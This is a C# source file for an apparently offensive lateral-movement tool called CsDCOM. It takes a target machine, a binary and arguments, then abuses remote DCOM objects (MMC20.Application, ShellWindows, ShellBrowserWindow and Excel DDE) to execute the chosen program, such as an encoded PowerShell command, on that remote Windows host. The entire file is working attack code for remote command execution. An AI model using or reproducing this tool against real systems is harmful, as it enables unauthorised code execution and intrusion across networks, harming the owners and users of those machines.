using System;
using System.Reflection;

using NDesk.Options;

namespace CsDCOM
{
    class Program
    {
        enum Method
        {
            MMC20Application,
            ShellWindows,
            ShellBrowserWindow,
            ExcelDDE
        }

        public static void ShowHelp(OptionSet p)
        {
            Console.WriteLine("Usage:");
            p.WriteOptionDescriptions(Console.Out);
        }

        static void Main(string[] args)
        {
            var help = false;
            var target = string.Empty;
            var binary = string.Empty;
            var arg = string.Empty;
            var method = string.Empty;
            Method dcomMethod;

            var options = new OptionSet(){
                {"t|target=","Target Machine", o => target = o},
                {"b|binary=","Binary: powershell.exe", o => binary = o},
                {"a|args=","Arguments: -enc <blah>", o => arg = o},
                {"m|method=","Method: MMC20Application, ShellWindows, ShellBrowserWindow, ExcelDDE", o => method = o},
                {"h|?|help","Show Help", o => help = true},
            };

            try
            {
                options.Parse(args);

                if (help)
                {
                    ShowHelp(options);
                    return;
                }

                if (string.IsNullOrEmpty(target) || string.IsNullOrEmpty(binary) || string.IsNullOrEmpty(arg) || string.IsNullOrEmpty(method))
                {
                    ShowHelp(options);
                    return;
                }

                if (!Enum.TryParse(method, true, out dcomMethod))
                {
                    ShowHelp(options);
                    return;
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message);
                ShowHelp(options);
                return;
            }

            switch (dcomMethod)
            {
                case Method.MMC20Application:
                    MMC20Application(target, binary, arg);
                    break;
                case Method.ShellWindows:
                    ShellWindows(target, binary, arg);
                    break;
                case Method.ShellBrowserWindow:
                    ShellBrowserWindow(target, binary, arg);
                    break;
                case Method.ExcelDDE:
                    ExcelDDE(target, binary, arg);
                    break;
            }
        }

        private static void MMC20Application(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromProgID("MMC20.Application", target);
                var obj = Activator.CreateInstance(type);
                var doc = obj.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, obj, null);
                var view = doc.GetType().InvokeMember("ActiveView", BindingFlags.GetProperty, null, doc, null);
                view.GetType().InvokeMember("ExecuteShellCommand", BindingFlags.InvokeMethod, null, view, new object[] { binary, null, arg, "7" });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        private static void ShellWindows(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromCLSID(new Guid("9BA05972-F6A8-11CF-A442-00A0C90A8F39"), target);
                var obj = Activator.CreateInstance(type);
                var item = obj.GetType().InvokeMember("Item", BindingFlags.InvokeMethod, null, obj, null);
                var doc = item.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, item, null);
                var app = doc.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, doc, null);
                app.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, app, new object[] { binary, arg, @"C:\Windows\System32", null, 0 });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        private static void ShellBrowserWindow(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromCLSID(new Guid("C08AFD90-F2A1-11D1-8455-00A0C91F3880"), target);
                var obj = Activator.CreateInstance(type);
                var doc = obj.GetType().InvokeMember("Document", BindingFlags.GetProperty, null, obj, null);
                var app = doc.GetType().InvokeMember("Application", BindingFlags.GetProperty, null, doc, null);
                app.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, app, new object[] { binary, arg, @"C:\Windows\System32", null, 0 });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }

        private static void ExcelDDE(string target, string binary, string arg)
        {
            try
            {
                var type = Type.GetTypeFromProgID("Excel.Application", target);
                var obj = Activator.CreateInstance(type);
                obj.GetType().InvokeMember("DisplayAlerts", BindingFlags.SetProperty, null, obj, new object[] { false });
                obj.GetType().InvokeMember("DDEInitiate", BindingFlags.InvokeMethod, null, obj, new object[] { binary, arg });
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }
    }
}